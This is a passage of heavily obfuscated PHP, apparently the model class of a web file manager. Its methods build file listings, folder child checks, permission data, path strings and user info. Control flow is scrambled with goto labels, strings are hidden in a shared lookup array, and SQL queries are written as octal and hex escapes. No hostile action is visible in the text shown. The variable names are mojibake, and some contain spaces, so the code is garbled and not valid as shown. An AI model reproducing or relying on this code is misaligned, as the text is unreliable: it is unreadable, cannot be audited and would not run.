$this->_listFilterInfo($cΩ—áããﬁ∞); goto B£É¬⁄¥¬⁄; eÃé¯ªùå…: } protected function _makeOrder() { goto cµı•«∑§Ì; F»˘È≤∑Ì»: $cÑÛıØ¢¨£ = array($cá„ÇàÈÎˆ[47] => $cá„ÇàÈÎˆ[48], $cá„ÇàÈÎˆ[49] => $cá„ÇàÈÎˆ[50]); $Eù˘Ôàâ√Ö = array($cá„ÇàÈÎˆ[32] => $cá„ÇàÈÎˆ[32], $cá„ÇàÈÎˆ[22] => $cá„ÇàÈÎˆ[22], $cá„ÇàÈÎˆ[10] => $cá„ÇàÈÎˆ[11], $cá„ÇàÈÎˆ[20] => $cá„ÇàÈÎˆ[20], $cá„ÇàÈÎˆ[51] => $cá„ÇàÈÎˆ[21], $cá„ÇàÈÎˆ[18] => $cá„ÇàÈÎˆ[18], $cá„ÇàÈÎˆ[19] => $cá„ÇàÈÎˆ[19]); $a†àä‹Õüß = Input::get($cá„ÇàÈÎˆ[52], $cá„ÇàÈÎˆ[3], $FüÔºÛÃª◊, array_keys($Eù˘Ôàâ√Ö)); goto F¶äÎ∏‰–±; cµı•«∑§Ì: $cá„ÇàÈÎˆ =& $_SERVER[á≠«ÈüÊıæ¸›]; $FüÔºÛÃª◊ = Model($cá„ÇàÈÎˆ[44])->get($cá„ÇàÈÎˆ[45]); $fìêë∏Ù≠˘ = Model($cá„ÇàÈÎˆ[44])->get($cá„ÇàÈÎˆ[46]); goto F»˘È≤∑Ì»; F¶äÎ∏‰–±: $f¢®ºÁï¶ô = Input::get($cá„ÇàÈÎˆ[53], $cá„ÇàÈÎˆ[3], $fìêë∏Ù≠˘, array_keys($cÑÛıØ¢¨£)); if (!in_array($a†àä‹Õüß, array_keys($Eù˘Ôàâ√Ö))) { $a†àä‹Õüß = $cá„ÇàÈÎˆ[32]; } if (!in_array($f¢®ºÁï¶ô, array_keys($cÑÛıØ¢¨£))) { $a†àä‹Õüß = $cá„ÇàÈÎˆ[47]; } goto cƒÑà©¿êâ; cƒÑà©¿êâ: if ($a†àä‹Õüß == $cá„ÇàÈÎˆ[32]) { } $déÌ‘›◊√® = $cá„ÇàÈÎˆ[54] . $Eù˘Ôàâ√Ö[$a†àä‹Õüß] . $cá„ÇàÈÎˆ[55] . $cÑÛıØ¢¨£[$f¢®ºÁï¶ô]; return $this->order(rtrim(trim($déÌ‘›◊√®), $cá„ÇàÈÎˆ[15])); goto C—ÕÌèπﬁÚ; C—ÕÌèπﬁÚ: } protected function _listDataApplyItem($e∑†àÜ‘∞ù, $bﬂµüﬂÉ›ø = false) { goto fÈ¡«»∞Ïò; Eú›·ìàÉÏ: if (!$bﬂµüﬂÉ›ø) { $this->_listAppendMeta($D•Á‘ûòÕö, $c÷Õ‚§ØÌÜ); $this->_listAppendChildren($D•Á‘ûòÕö, $c÷Õ‚§ØÌÜ); $this->_listAppendPath($D•Á‘ûòÕö); } $this->_listAppendSourceInfo($D•Á‘ûòÕö, $c÷Õ‚§ØÌÜ); $this->_listAppendUser($D•Á‘ûòÕö); goto d÷ù†æ≤¬¢; fÈ¡«»∞Ïò: $D•Á‘ûòÕö = array($e∑†àÜ‘∞ù); $c÷Õ‚§ØÌÜ = array($e∑†àÜ‘∞ù[$_SERVER[á≠«ÈüÊıæ¸›][2]]); $this->_listAppendAuth($D•Á‘ûòÕö); goto Eú›·ìàÉÏ; d÷ù†æ≤¬¢: $D£–∏§ü…— = $this->pathInfoFilter($D•Á‘ûòÕö[0]); return $D£–∏§ü…—; goto E§Á®∏óîÓ; E§Á®∏óîÓ: } protected function _listDataApply(&$bàπ˘ïﬁøÏ) { goto Aè“ª•≥áÇ; Aè“ª•≥áÇ: $EíÑ´’ô∂Ñ =& $_SERVER[á≠«ÈüÊıæ¸›]; if (!$bàπ˘ïﬁøÏ) { $bàπ˘ïﬁøÏ = array(); return; } $B∏§ú∏ª—ø = array_to_keyvalue($bàπ˘ïﬁøÏ, $EíÑ´’ô∂Ñ[1], $EíÑ´’ô∂Ñ[2]); goto d‘∂‰ÎâÑ§; d‘∂‰ÎâÑ§: $B∏§ú∏ª—ø = array_unique($B∏§ú∏ª—ø); $this->_listAppendAuth($bàπ˘ïﬁøÏ); $this->_listAppendMeta($bàπ˘ïﬁøÏ, $B∏§ú∏ª—ø); goto eÇää≈«√à; eÇää≈«√à: $this->_listAppendSourceInfo($bàπ˘ïﬁøÏ, $B∏§ú∏ª—ø); $this->_listAppendChildren($bàπ˘ïﬁøÏ, $B∏§ú∏ª—ø); $this->_listAppendUser($bàπ˘ïﬁøÏ); goto EÇüòÉÖœí; EÇüòÉÖœí: $this->_listAppendPath($bàπ˘ïﬁøÏ); goto bÕ…‚¶á∏È; bÕ…‚¶á∏È: } protected function _listFilterInfo(&$Aæì¥å¢€Â) { $få’˘æ‘üŸ =& $_SERVER[á≠«ÈüÊıæ¸›]; $Aæì¥å¢€Â[$få’˘æ‘üŸ[56]] = array(); $Aæì¥å¢€Â[$få’˘æ‘üŸ[57]] = array(); foreach ($Aæì¥å¢€Â[$få’˘æ‘üŸ[28]] as $DƒæÈ—¿¬ú) { $E…Ó∫•€Úæ = $DƒæÈ—¿¬ú[$få’˘æ‘üŸ[6]] == 1 ? $få’˘æ‘üŸ[56] : $få’˘æ‘üŸ[57]; $Aæì¥å¢€Â[$E…Ó∫•€Úæ][] = $this->pathInfoFilter($DƒæÈ—¿¬ú); } unset($Aæì¥å¢€Â[$få’˘æ‘üŸ[28]]); } protected function _listAppendMeta(&$eè ‡®¢÷ﬁ, $bíÓ∏»∂„¥) { goto Dï´§üÉπÇ; fÀÆÙ÷ºÆë: foreach ($eè ‡®¢÷ﬁ as &$B‚æÊ≈Ó‡Ì) { $B‚æÊ≈Ó‡Ì[$a¯É©∂å†Ö[62]] = !1; if (isset($d‚Îıñ·˘†[$B‚æÊ≈Ó‡Ì[$a¯É©∂å†Ö[2]]])) { $B‚æÊ≈Ó‡Ì[$a¯É©∂å†Ö[62]] = $d‚Îıñ·˘†[$B‚æÊ≈Ó‡Ì[$a¯É©∂å†Ö[2]]]; } } goto eõ¡ìµﬁ©‚; Dï´§üÉπÇ: $a¯É©∂å†Ö =& $_SERVER[á≠«ÈüÊıæ¸›]; $aÁÆãù∞»¯ = array($a¯É©∂å†Ö[26] => array($a¯É©∂å†Ö[27], $bíÓ∏»∂„¥)); $c§Ωï˜‰©â = Model($a¯É©∂å†Ö[58])->field($a¯É©∂å†Ö[59])->where($aÁÆãù∞»¯)->select(); goto F®€˜àì˘©; F®€˜àì˘©: if (!$c§Ωï˜‰©â) { return; } $d‚Îıñ·˘† = array(); foreach ($c§Ωï˜‰©â as $Cº¶ÉÆ‹«º) { if (!isset($d‚Îıñ·˘†[$Cº¶ÉÆ‹«º[$a¯É©∂å†Ö[2]]])) { $d‚Îıñ·˘†[$Cº¶ÉÆ‹«º[$a¯É©∂å†Ö[2]]] = array(); } $d‚Îıñ·˘†[$Cº¶ÉÆ‹«º[$a¯É©∂å†Ö[2]]][$Cº¶ÉÆ‹«º[$a¯É©∂å†Ö[60]]] = $Cº¶ÉÆ‹«º[$a¯É©∂å†Ö[61]]; } goto fÀÆÙ÷ºÆë; eõ¡ìµﬁ©‚: } protected function _listAppendSourceInfo(&$FÓà¡ıíıÚ, $EÌ”çÊü≠ì) { goto f≠Â€©îÀõ; bƒªŒ…Ω¬Ú: $f≠˜Ç¬±í¢ = array_to_keyvalue_group($e—†¢åú•Ç, $c÷‰®ë—„∫[4], $c÷‰®ë—„∫[39]); $bÚÜ‡ÓﬁÈ = array_to_keyvalue($eå‰ºÏÀõ¿, $c÷‰®ë—„∫[4]); $b¢ÎØó∑æ· = array_to_keyvalue_group($Eãå∂‰¬à, $c÷‰®ë—„∫[2]); goto Cûπ·ÆΩÚ¿; f≠Â€©îÀõ: $c÷‰®ë—„∫ =& $_SERVER[á≠«ÈüÊıæ¸›]; $F’º‰àƒÜ… = Model($c÷‰®ë—„∫[63])->listData(); $e—†¢åú•Ç = Model($c÷‰®ë—„∫[38])->listData(); goto f˘ˆ›¨≈⁄‘; Cûπ·ÆΩÚ¿: foreach ($FÓà¡ıíıÚ as &$e¬–ìæΩ’∆) { $e¬–ìæΩ’∆[$c÷‰®ë—„∫[37]] = array($c÷‰®ë—„∫[65] => 0, $c÷‰®ë—„∫[66] => 0, $c÷‰®ë—„∫[67] => 0); if (isset($bÚÜ‡ÓﬁÈ[$e¬–ìæΩ’∆[$c÷‰®ë—„∫[2]]])) { $e¬–ìæΩ’∆[$c÷‰®ë—„∫[37]][$c÷‰®ë—„∫[68]] = 1; $e¬–ìæΩ’∆[$c÷‰®ë—„∫[37]][$c÷‰®ë—„∫[69]] = $bÚÜ‡ÓﬁÈ[$e¬–ìæΩ’∆[$c÷‰®ë—„∫[2]]][$c÷‰®ë—„∫[32]]; } if (isset($f≠˜Ç¬±í¢[$e¬–ìæΩ’∆[$c÷‰®ë—„∫[2]]])) { $e¬–ìæΩ’∆[$c÷‰®ë—„∫[37]][$c÷‰®ë—„∫[70]] = array(); foreach ($f≠˜Ç¬±í¢[$e¬–ìæΩ’∆[$c÷‰®ë—„∫[2]]] as $A„Ë†‰Úâ≈) { $eÿ∂Îé©•« = $eÖ”Ñëí¥Ç[$A„Ë†‰Úâ≈]; $e¬–ìæΩ’∆[$c÷‰®ë—„∫[37]][$c÷‰®ë—„∫[70]][] = array($c÷‰®ë—„∫[71] => $eÿ∂Îé©•«[$c÷‰®ë—„∫[30]], $c÷‰®ë—„∫[31] => $eÿ∂Îé©•«[$c÷‰®ë—„∫[32]], $c÷‰®ë—„∫[72] => $eÿ∂Îé©•«[$c÷‰®ë—„∫[73]]); } } if (isset($b¢ÎØó∑æ·[$e¬–ìæΩ’∆[$c÷‰®ë—„∫[2]]])) { $e¬–ìæΩ’∆[$c÷‰®ë—„∫[37]][$c÷‰®ë—„∫[74]] = array(); foreach ($b¢ÎØó∑æ·[$e¬–ìæΩ’∆[$c÷‰®ë—„∫[2]]] as $D÷Œ£Û˜à©) { $e¬–ìæΩ’∆[$c÷‰®ë—„∫[37]][$c÷‰®ë—„∫[74]] = array($c÷‰®ë—„∫[75] => $D÷Œ£Û˜à©[$c÷‰®ë—„∫[76]], $c÷‰®ë—„∫[77] => $D÷Œ£Û˜à©[$c÷‰®ë—„∫[78]], $c÷‰®ë—„∫[79] => $D÷Œ£Û˜à©[$c÷‰®ë—„∫[80]], $c÷‰®ë—„∫[81] => $D÷Œ£Û˜à©[$c÷‰®ë—„∫[82]]); } } } return $FÓà¡ıíıÚ; goto DØÌ›®ü∑Ç; f˘ˆ›¨≈⁄‘: $eå‰ºÏÀõ¿ = Model($c÷‰®ë—„∫[24])->listData(); $Eãå∂‰¬à = Model($c÷‰®ë—„∫[64])->listSimple(); $eÖ”Ñëí¥Ç = array_to_keyvalue($F’º‰àƒÜ…, $c÷‰®ë—„∫[30]); goto bƒªŒ…Ω¬Ú; DØÌ›®ü∑Ç: } protected function _listAppendChildren(&$dêÈÎª„øº, $b¢òç©âÚß) { goto A„Ö°¥§óÖ; A„Ö°¥§óÖ: $eåÁé¡å‚Ë =& $_SERVER[á≠«ÈüÊıæ¸›]; $BÌ›êä–ÍÂ = $eåÁé¡å‚Ë[83]; $B™Õ≠éâ©â = array(); goto BÍí€â“¨à; BÍí€â“¨à: $bñ†ì∫›ç… = 1024 * 50; $AèÖ ôÖú = count($dêÈÎª„øº); $fÖﬁë˘òåâ = $this->tablePrefix . $this->tableName; goto Có°Ùåö∑„; Có°Ùåö∑„: for ($C„ãƒœØ∑‰ = 0; $C„ãƒœØ∑‰ < $AèÖ ôÖú; $C„ãƒœØ∑‰++) { if ($dêÈÎª„øº[$C„ãƒœØ∑‰][$eåÁé¡å‚Ë[6]]) { $d£Ï÷∑’≈è = $dêÈÎª„øº[$C„ãƒœØ∑‰][$eåÁé¡å‚Ë[2]]; $BÌ›êä–ÍÂ .= "\123\x45\114\105\x43\124\x20\52\40\x46\x52\117\115\x20\50\123\105\114\x45\103\124\40\47{$d£Ï÷∑’≈è}\137\150\x61\x73\106\151\x6c\145\x27\x20\141\163\x20\x68\141\163\40\x46\122\x4f\x4d\40\140{$fÖﬁë˘òåâ}\x60\40\xa\11\11\x9\11\x9\167\x68\x65\x72\x65\40\x70\x61\x72\x65\156\164\x49\104\x3d{$d£Ï÷∑’≈è}\x20\141\x6e\x64\x20\x69\163\106\157\x6c\x64\x65\x72\x3d\x30\x20\141\156\x64\x20\151\x73\104\x65\154\x65\x74\145\x3d\60\x20\154\x69\155\x69\164\40\x31\51\x20\141\x73\x20\x74\x62\x31\x5f{$d£Ï÷∑’≈è}\40\165\156\x69\157\x6e\40\x61\154\x6c\40\12\x9\11\x9\11\x9\x53\x45\114\x45\103\124\x20\x2a\40\106\x52\117\115\x20\x28\123\105\x4c\105\103\x54\x20\x27{$d£Ï÷∑’≈è}\137\150\141\x73\x46\x6f\x6c\144\x65\162\47\x20\141\163\x20\150\x61\163\106\x69\154\x65\x20\106\x52\117\x4d\40\140{$fÖﬁë˘òåâ}\x60\40\xa\11\x9\x9\x9\x9\x77\x68\x65\x72\x65\x20\x70\141\162\x65\x6e\164\x49\104\75{$d£Ï÷∑’≈è}\x20\x61\x6e\x64\40\151\163\x46\x6f\154\144\145\x72\x3d\61\40\x61\156\144\40\x69\163\104\x65\154\x65\x74\x65\75\x30\x20\x6c\151\155\x69\164\x20\x31\x29\40\141\163\x20\164\x62\62\137{$d£Ï÷∑’≈è}\40\x75\x6e\151\x6f\x6e\x20\x61\x6c\x6c\40"; } if ((strlen($BÌ›êä–ÍÂ) >= $bñ†ì∫›ç… || $C„ãƒœØ∑‰ == $AèÖ ôÖú - 1) && $BÌ›êä–ÍÂ) { $BÌ›êä–ÍÂ = substr($BÌ›êä–ÍÂ, 0, -strlen($eåÁé¡å‚Ë[84])); $fØπ÷»˘∆ã = $this->query($BÌ›êä–ÍÂ); $B™Õ≠éâ©â = array_merge($B™Õ≠éâ©â, $fØπ÷»˘∆ã); $BÌ›êä–ÍÂ = $eåÁé¡å‚Ë[1]; } } $B™Õ≠éâ©â = array_to_keyvalue($B™Õ≠éâ©â, $eåÁé¡å‚Ë[85], $eåÁé¡å‚Ë[85]); foreach ($dêÈÎª„øº as &$FœŸÊåñÓ«) { if ($FœŸÊåñÓ«[$eåÁé¡å‚Ë[6]]) { unset($FœŸÊåñÓ«[$eåÁé¡å‚Ë[11]]); $FœŸÊåñÓ«[$eåÁé¡å‚Ë[86]] = isset($B™Õ≠éâ©â[$FœŸÊåñÓ«[$eåÁé¡å‚Ë[2]] . $eåÁé¡å‚Ë[87]]); $FœŸÊåñÓ«[$eåÁé¡å‚Ë[88]] = isset($B™Õ≠éâ©â[$FœŸÊåñÓ«[$eåÁé¡å‚Ë[2]] . $eåÁé¡å‚Ë[89]]); } } goto F´€Áºîâò; F´€Áºîâò: } protected function _listAppendAuth(&$AÈë∆ÀóÂí) { goto AÓ§Ñ—•˘Ü; F™÷„ ö÷˜: foreach ($AÈë∆ÀóÂí as $b§¥Áãî≤µ => &$fƒ‘Ò¶Ñãœ) { $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[16]] = $dÚ‘¬“Úﬂ∫[$fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[2]]]; if (!$fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[16]] && $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[9]] == self::TYPE_GROUP) { $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[16]] = Action($dÃ—˘» ﬁû[91])->pathGroupAuthMake($fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[92]]); if (!$fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[16]] && !$GLOBALS[$dÃ—˘» ﬁû[93]]) { $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[94]] = !1; $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[95]] = !1; } } if ($fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[16]]) { $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[94]] = AuthModel::authCheckEdit($fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[16]][$dÃ—˘» ﬁû[17]]); $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[95]] = AuthModel::authCheckView($fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[16]][$dÃ—˘» ﬁû[17]]); } $this->groupPathDisplay($fƒ‘Ò¶Ñãœ); } goto Eô”ÜÑ‘∏‘; AÓ§Ñ—•˘Ü: $dÃ—˘» ﬁû =& $_SERVER[á≠«ÈüÊıæ¸›]; $D”Úëåëãô = array(); foreach ($AÈë∆ÀóÂí as $fƒ‘Ò¶Ñãœ) { if ($fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[9]] == self::TYPE_GROUP) { $D”Úëåëãô[] = $fƒ‘Ò¶Ñãœ[$dÃ—˘» ﬁû[2]]; } } goto dÒÇÑÑ≈ä†; dÒÇÑÑ≈ä†: if (!$D”Úëåëãô) { return; } $B“èì„†ÜÖ = array_to_keyvalue($AÈë∆ÀóÂí, $dÃ—˘» ﬁû[2]); $dÚ‘¬“Úﬂ∫ = Model($dÃ—˘» ﬁû[90])->getSourceList($D”Úëåëãô, $B“èì„†ÜÖ); goto F™÷„ ö÷˜; Eô”ÜÑ‘∏‘: } public function groupPathDisplay(&$bÌƒõ›Üê≥) { goto Aè¯Ã»µ¯«; FêÑº⁄çª√: $bÌƒõ›Üê≥[$Eãàë∂ÈÇ[98]] = $A˜æè´∑‘˜[$Eãàë∂ÈÇ[99]]; $bÌƒõ›Üê≥[$Eãàë∂ÈÇ[23]] = $A˜æè´∑‘˜[$Eãàë∂ÈÇ[97]]; $bÌƒõ›Üê≥[$Eãàë∂ÈÇ[100]] = $A˜æè´∑‘˜[$Eãàë∂ÈÇ[101]]; goto b‹œâ∆—Ô÷; b§Ñõ¨ÑÉ·: $aê∑É¬„ø = $this->parentLevelArray($A˜æè´∑‘˜[$Eãàë∂ÈÇ[97]]); $B”•‘“ÜË≥ = $Eãàë∂ÈÇ[1]; foreach ($aê∑É¬„ø as $fèÁ¶◊◊√ã) { $eô∑ßä–ƒ‰ = Model($Eãàë∂ÈÇ[96])->getInfo($fèÁ¶◊◊√ã); $B”•‘“ÜË≥ .= $eô∑ßä–ƒ‰[$Eãàë∂ÈÇ[37]][$Eãàë∂ÈÇ[2]] . $Eãàë∂ÈÇ[15]; } goto FêÑº⁄çª√; b‹œâ∆—Ô÷: $bÌƒõ›Üê≥[$Eãàë∂ÈÇ[102]] = $B”•‘“ÜË≥ . $A˜æè´∑‘˜[$Eãàë∂ÈÇ[37]][$Eãàë∂ÈÇ[2]]; goto C«àá¶é«î; Aè¯Ã»µ¯«: $Eãàë∂ÈÇ =& $_SERVER[á≠«ÈüÊıæ¸›]; if ($bÌƒõ›Üê≥[$Eãàë∂ÈÇ[9]] != self::TYPE_GROUP) { return; } $A˜æè´∑‘˜ = Model($Eãàë∂ÈÇ[96])->getInfo($bÌƒõ›Üê≥[$Eãàë∂ÈÇ[92]]); goto b§Ñõ¨ÑÉ·; C«àá¶é«î: } protected function _listAppendPath(&$eﬂ€¶ªÃﬂê) { goto AÉΩÓ∞ê„û; f—ºñóª’∂: $Aπòè˜±åê = array(); foreach ($AÔ©”è¿àŒ as $f—‹é¬À•« => $D¬©˘∆·∆⁄) { if (!$D¬©˘∆·∆⁄) { $Aπòè˜±åê[] = $f—‹é¬À•«; } } if ($Aπòè˜±åê) { $d§‡¥°êêÑ = array($Eô´ì£å˘”[26] => array($Eô´ì£å˘”[27], $Aπòè˜±åê)); $C“∫Øﬂ≤˘’ = $this->field($Eô´ì£å˘”[103])->where($d§‡¥°êêÑ)->select(); $eÜ≥ÛÉÖ∞± = array_to_keyvalue($C“∫Øﬂ≤˘’, $Eô´ì£å˘”[2], $Eô´ì£å˘”[32]); $AÔ©”è¿àŒ = array_merge_index($AÔ©”è¿àŒ, $eÜ≥ÛÉÖ∞±); } goto BæÃâΩäùÒ; AÉΩÓ∞ê„û: $Eô´ì£å˘” =& $_SERVER[á≠«ÈüÊıæ¸›]; $AÔ©”è¿àŒ = array(); foreach ($eﬂ€¶ªÃﬂê as &$BÈ·“ƒ°Ÿÿ) { $AÔ©”è¿àŒ[$BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[2]]] = $BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[32]]; $d √ƒéÁ“‹ = $this->parentLevelArray($BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[97]]); array_shift($d √ƒéÁ“‹); foreach ($d √ƒéÁ“‹ as $C…∫ΩéÑúÊ) { if (!isset($AÔ©”è¿àŒ[$C…∫ΩéÑúÊ])) { $AÔ©”è¿àŒ[$C…∫ΩéÑúÊ] = 0; } } } goto f—ºñóª’∂; BæÃâΩäùÒ: foreach ($eﬂ€¶ªÃﬂê as &$BÈ·“ƒ°Ÿÿ) { goto F∆éıù•ÜÇ; d”ΩÀ˜˘ß«: $AÍ „¿‹É– = trim($BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[105]], $Eô´ì£å˘”[104]); if ($BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[99]] == $Eô´ì£å˘”[107] && $AÍ „¿‹É–) { $BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[32]] = $AÍ „¿‹É–; } goto e∂ó¡€ÀÜÔ; fﬂëççç≤Ω: if ($d √ƒéÁ“‹) { $D§ö‡£ÂÇÙ .= $BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[32]]; } if ($BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[6]]) { $D§ö‡£ÂÇÙ .= $Eô´ì£å˘”[104]; } $BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[105]] = str_replace($Eô´ì£å˘”[106], $Eô´ì£å˘”[104], $D§ö‡£ÂÇÙ); goto d”ΩÀ˜˘ß«; F∆éıù•ÜÇ: $d √ƒéÁ“‹ = $this->parentLevelArray($BÈ·“ƒ°Ÿÿ[$Eô´ì£å˘”[97]]); $D§ö‡£ÂÇÙ = $this->_listAppendPathRoot($BÈ·“ƒ°Ÿÿ, $d √ƒéÁ“‹); foreach ($d √ƒéÁ“‹ as $C…∫ΩéÑúÊ) { if (isset($AÔ©”è¿àŒ[$C…∫ΩéÑúÊ])) { $D§ö‡£ÂÇÙ .= $AÔ©”è¿àŒ[$C…∫ΩéÑúÊ] . $Eô´ì£å˘”[104]; } } goto fﬂëççç≤Ω; e∂ó¡€ÀÜÔ: } goto AŒ…êÌ∏î; AŒ…êÌ∏î: } protected function _listAppendPathRoot(&$bûßë ÓŒ›, $DÕãº™Ö•Æ) { $Eöû‚§≥·ë =& $_SERVER[á≠«ÈüÊıæ¸›]; $eúóÓ§ﬂÂ = $Eöû‚§≥·ë[1]; if ($bûßë ÓŒ›[$Eöû‚§≥·ë[9]] == self::TYPE_USER) { if ($bûßë ÓŒ›[$Eöû‚§≥·ë[92]] == USER_ID) { $eúóÓ§ﬂÂ = LNG($Eöû‚§≥·ë[108]); if (!$DÕãº™Ö•Æ) { $bûßë ÓŒ›[$Eöû‚§≥·ë[32]] = $eúóÓ§ﬂÂ; } } else { $bÉµÛÙÛ–» = Model($Eöû‚§≥·ë[109])->getInfoSimple($bûßë ÓŒ›[$Eöû‚§≥·ë[92]]); $eúóÓ§ﬂÂ = $Eöû‚§≥·ë[110] . $bÉµÛÙÛ–»[$Eöû‚§≥·ë[32]] . $Eöû‚§≥·ë[111]; } } else { if ($bûßë ÓŒ›[$Eöû‚§≥·ë[9]] == self::TYPE_GROUP) { $bÉµÛÙÛ–» = Model($Eöû‚§≥·ë[96])->getInfoSimple($bûßë ÓŒ›[$Eöû‚§≥·ë[92]]); $eúóÓ§ﬂÂ = $bÉµÛÙÛ–»[$Eöû‚§≥·ë[32]]; } else { if ($bûßë ÓŒ›[$Eöû‚§≥·ë[9]] == self::TYPE_SYSTEM) { $bÉµÛÙÛ–» = $this->sourceInfo($DÕãº™Ö•Æ[0], !0); $eúóÓ§ﬂÂ = $bÉµÛÙÛ–»[$Eöû‚§≥·ë[32]]; } } } $eúóÓ§ﬂÂ = $eúóÓ§ﬂÂ ? $Eöû‚§≥·ë[104] . $eúóÓ§ﬂÂ . $Eöû‚§≥·ë[104] : $Eöû‚§≥·ë[104]; return $eúóÓ§ﬂÂ; } protected function _listAppendUser(&$f†»À¥·å‚) { $f››Ω¶⁄ŸÔ =& $_SERVER[á≠«ÈüÊıæ¸›]; $C«¡∏ÿµ¥Ó = array_to_keyvalue($f†»À¥·å‚, $f››Ω¶⁄ŸÔ[1], $f››Ω¶⁄ŸÔ[20]); $DØïÜµ•… = array_to_keyvalue($f†»À¥·å‚, $f››Ω¶⁄ŸÔ[1], $f››Ω¶⁄ŸÔ[21]); $fâ”¨°à–‚ = array_merge($C«¡∏ÿµ¥Ó, $DØïÜµ•…); $dØ¬éûü∞ = Model($f››Ω¶⁄ŸÔ[112])->userListInfo($fâ”¨°à–‚); foreach ($f†»À¥·å‚ as &$EªÁÕüâ≤˘) { $AÛì¿çå◊ã = $EªÁÕüâ≤˘[$f››Ω¶⁄ŸÔ[20]]; $EªÁÕüâ≤˘[$f››Ω¶⁄ŸÔ[20]] = $dØ¬éûü∞[$AÛì¿çå◊ã] ? $dØ¬éûü∞[$AÛì¿çå◊ã] : !1; $AÛì¿çå◊ã = $EªÁÕüâ≤˘[$f››Ω¶⁄ŸÔ[21]]; $EªÁÕüâ≤˘[$f››Ω¶⁄ŸÔ[21]] = $dØ¬éûü∞[$AÛì¿çå◊ã] ? $dØ¬éûü∞[$AÛì¿çå◊ã] : !1; } } public function parentLevelArray($AÏ≥éä˘Ö´) { $F√úÃ≈ôùƒ =& $_SERVER[á≠«ÈüÊıæ¸›]; $AÏ≥éä˘Ö´ = explode($F√úÃ≈ôùƒ[15], trim($AÏ≥éä˘Ö´, $F√úÃ≈ôùƒ[15])); return array_remove_value($AÏ≥éä˘Ö´, $F√úÃ≈ôùƒ[107]); } public function listAll($D‰≤ÿŒÒıú) { goto bÇ°Ò§æ»—; aË◊∂Ëºä : $e≈ØíöÍΩê = $aâ„”èáû†[117]; $e˜âèßâ´ã = "\114\x45\106\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\151\157\x5f\x66\151\154\145\x20\146\x69\x6c\x65\40\x6f\x6e\x20\163\x6f\165\162\143\x65\x2e\x66\x69\x6c\x65\x49\x44\x20\x3d\x20\146\x69\x6c\x65\x2e\x66\151\154\x65\111\x44"; $c§Ö≥≤«ù√ = $this->alias($aâ„”èáû†[118])->field($e≈ØíöÍΩê)->where($F•ËÜ≥œ·ﬁ)->join($e˜âèßâ´ã)->select(); goto b·≈’‚∑‚; bÇ°Ò§æ»—: $aâ„”èáû† =& $_SERVER[á≠«ÈüÊıæ¸›]; $Cﬁà⁄±ŒÍ– = $this->sourceInfo($D‰≤ÿŒÒıú); $F•ËÜ≥œ·ﬁ = array($aâ„”èáû†[113] => array($aâ„”èáû†[114], $Cﬁà⁄±ŒÍ–[$aâ„”èáû†[97]] . $D‰≤ÿŒÒıú . $aâ„”èáû†[115]), $aâ„”èáû†[116] => 0); goto aË◊∂Ëºä ; Eê—ÆõíÛ⁄: $AÁ¥õ©‡Û∑ = array(array($aâ„”èáû†[33] => $B¢Û Ó«ØÚ, $aâ„”èáû†[119] => 1, $aâ„”èáû†[120] => 0)); if ($B¢Û Ó«ØÚ == $aâ„”èáû†[104]) { $AÁ¥õ©‡Û∑ = array(); } foreach ($c§Ö≥≤«ù√ as $Aá“Ûø´ß¥ => $C√Ï•¬Áå·) { goto dËπÇÃö“; dËπÇÃö“: $f≤ÌºÂÒ•√ = $this->parentLevelArray($C√Ï•¬Áå·[$aâ„”èáû†[97]]); array_shift($f≤ÌºÂÒ•√); $e≥üúπéﬁ∂ = $B¢Û Ó«ØÚ; goto EÃ»ëŒ…Ö¶; C¢ÖÉå≤ÔÆ: $eπ›ÎÇ»÷” = array($aâ„”èáû†[33] => str_replace($aâ„”èáû†[106], $aâ„”èáû†[104], $e≥üúπéﬁ∂), $aâ„”èáû†[119] => intval($C√Ï•¬Áå·[$aâ„”èáû†[6]])); if (!$C√Ï•¬Áå·[$aâ„”èáû†[6]]) { $eπ›ÎÇ»÷”[$aâ„”èáû†[8]] = $C√Ï•¬Áå·[$aâ„”èáû†[4]]; $eπ›ÎÇ»÷”[$aâ„”èáû†[22]] = $C√Ï•¬Áå·[$aâ„”èáû†[22]]; } $AÁ¥õ©‡Û∑[] = $eπ›ÎÇ»÷”; goto bü§Ç®§ñ; EÃ»ëŒ…Ö¶: for ($f®Öı¬∑ · = 0; $f®Öı¬∑ · < count($f≤ÌºÂÒ•√); $f®Öı¬∑ ·++) { $e≥üúπéﬁ∂ .= $c§Ö≥≤«ù√[$f≤ÌºÂÒ•√[$f®Öı¬∑ ·]][$aâ„”èáû†[32]] . $aâ„”èáû†[104]; } $e≥üúπéﬁ∂ .= $C√Ï•¬Áå·[$aâ„”èáû†[32]]; if ($C√Ï•¬Áå·[$aâ„”èáû†[6]]) { $e≥üúπéﬁ∂ .= $aâ„”èáû†[104]; } goto C¢ÖÉå≤ÔÆ; bü§Ç®§ñ: } goto dƒÜû˜‹É∂; b·≈’‚∑‚: $c§Ö≥≤«ù√ = array_to_keyvalue($c§Ö≥≤«ù√, $aâ„”èáû†[2]); $B¢Û Ó«ØÚ = "\x2f{$Cﬁà⁄±ŒÍ–[$aâ„”èáû†[32]]}\57"; $B¢Û Ó«ØÚ = $B¢Û 